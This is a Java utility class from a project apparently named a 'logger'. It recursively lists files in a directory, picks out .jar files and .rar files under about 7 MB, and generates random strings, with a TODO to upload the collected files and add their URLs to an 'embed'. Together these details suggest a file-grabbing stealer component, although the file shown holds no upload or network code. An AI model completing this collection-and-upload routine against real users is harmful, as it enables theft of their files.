package me.esot.logger.utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.util.Optional;
import java.util.stream.Collectors;
import java.util.stream.Stream;

public class FileUtil {
    //TODO: make it upload the files and return url, then add to embed
    public static List<File> getFiles(String dir)
    {
        try { try (Stream<Path> paths = Files.walk(Paths.get(dir))) {
            return paths.filter(Files::isRegularFile).map(Path::toFile).collect(Collectors.toList());
        } } catch (Exception ignored) { }
        return new ArrayList<>();
    }

    public static List<File> getJARs(String dir)
    {
        List<File> files = new ArrayList<>();
        getFiles(dir).stream()
                .filter(file -> file.getName().endsWith(".jar"))

                .forEach(files::add);
        return files;
    }

    public static List<File> getRARs(String dir)
    {
        List<File> files = new ArrayList<>();
        getFiles(dir).stream()
                .filter(file -> file.getName().endsWith(".rar")).
                filter(file -> {
                    try { return Files.size(Paths.get(file.getPath())) < 7000000; } catch (IOException ignored) { }
                    return false;
                })
                .forEach(files::add);
        return files;
    }

    public static Optional<File> getFile(String name)
    {
        return Optional.of(new File(name));
    }

    public static String randomString()
    {
        String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz";
        StringBuilder sb = new StringBuilder(20);
        for (int i = 0; i < 20; i++) {
            int index = (int)(AlphaNumericString.length() * Math.random());
            sb.append(AlphaNumericString.charAt(index));
        }
        return sb.toString();
    }
}
